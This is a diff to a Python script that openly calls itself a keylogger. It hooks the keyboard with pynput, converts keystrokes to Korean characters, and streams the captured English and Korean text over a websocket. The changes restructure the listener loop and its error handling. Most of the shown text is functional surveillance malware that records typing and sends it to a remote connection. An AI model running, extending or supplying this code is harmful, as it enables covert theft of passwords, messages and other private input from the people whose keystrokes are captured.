@@ -3,6 +3,7 @@ from pynput.keyboard import Listener, Key
 import asyncio
 import websockets
 import queue
+import sys
 
 logs = ''
 saveEn = queue.Queue()
@@ -17,7 +18,7 @@ vowels = {'k':'ㅏ', 'o':'ㅐ', 'i':'ㅑ', 'O':'ㅒ', 'j':'ㅓ', 'p':'ㅔ', 'u':
 cons_double = {'rt':'ㄳ', 'sw':'ㄵ', 'sg':'ㄶ', 'fr':'ㄺ', 'fa':'ㄻ', 'fq':'ㄼ', 'ft':'ㄽ', 'fx':'ㄾ', 'fv':'ㄿ', 'fg':'ㅀ', 'qt':'ㅄ'}
 
 def convert_to_korean(text):
-    
+
     converted_text = ''
     i = 0
     while i < len(text):
@@ -53,28 +54,37 @@ def on_press(key):
         logs += str(key).replace("'", "")
 
 async def log(websocket, path):
-    with Listener(on_press=on_press) as listener:
-        try:
-            await retrieve_data(websocket)
-            listener.join()
-        except KeyboardInterrupt:
-            pass
-        except Exception as e:
-            print(f'Keylogger error: {e}')
-        except websockets.exceptions.ConnectionClosedOK:
-            pass
-
-async def retrieve_data(websocket):
-    while True:
-        try:
-            if not saveEn.empty():
-                dataEn = saveEn.get()
-                dataKo = saveKo.get()
-                data = f'En:{dataEn}\n Ko:{dataKo}'
-                await websocket.send(data)
-            else:
-                pass
-            await asyncio.sleep(1)
-
-        except Exception as e:
-            print(f'Data retrieval error: {e}')
+    print('Keylogger Start...')
+    listener = Listener(on_press=on_press)
+    listener.start()
+    try:
+        while True:
+            try:
+                if not saveEn.empty():
+                    dataEn = saveEn.get()
+                    dataKo = saveKo.get()
+                    data = f'En:{dataEn}\n Ko:{dataKo}'
+                    await websocket.send(data)
+                else:
+                    pass
+                await asyncio.sleep(1)
+            except Exception as e:
+                print(f'Keylogger error: {e}')
+                listener.stop()
+                listener.join()
+                await websocket.close()
+                break  
+            except KeyboardInterrupt:
+                sys.exit(0)
+                break
+            except websockets.exceptions.ConnectionClosedOK:
+                break    
+    except KeyboardInterrupt:
+        pass
+    except Exception as e:
+        print(f'Keylogger error: {e}')
+    except websockets.exceptions.ConnectionClosedOK:
+        pass
+    except websockets.ConnectionClosed:
+        listener.join()
+        pass
